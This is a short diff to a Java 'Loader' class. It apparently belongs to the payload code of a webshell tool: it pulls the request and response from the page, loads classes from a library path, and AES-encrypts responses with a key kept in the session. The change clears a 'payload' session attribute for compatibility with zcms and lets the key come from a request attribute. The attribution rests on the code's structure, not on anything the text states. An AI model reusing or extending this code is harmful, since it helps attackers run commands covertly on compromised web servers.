@@ -35,6 +35,10 @@ public class Loader
         this.Response = page.getResponse();
         this.Request = page.getRequest();
         final Map<String, String> result = new HashMap<String, String>();
+        //兼容zcms
+        if(Session.getAttribute("payload")!=null){
+            Session.removeAttribute("payload");
+        }
         try {
             final URL url = new File(Loader.libPath).toURI().toURL();
             final URLClassLoader urlClassLoader = (URLClassLoader)ClassLoader.getSystemClassLoader();
@@ -106,7 +110,8 @@ public class Loader
     }
     
     private byte[] Encrypt(final byte[] bs) throws Exception {
-        final String key = this.Session.getAttribute("u").toString();
+        final Object custmKeyObj = this.Request.getAttribute("parameters");
+        final String key = (custmKeyObj!=null&&custmKeyObj instanceof String) ? custmKeyObj.toString():this.Session.getAttribute("u").toString();
         final byte[] raw = key.getBytes("utf-8");
         final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
         final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
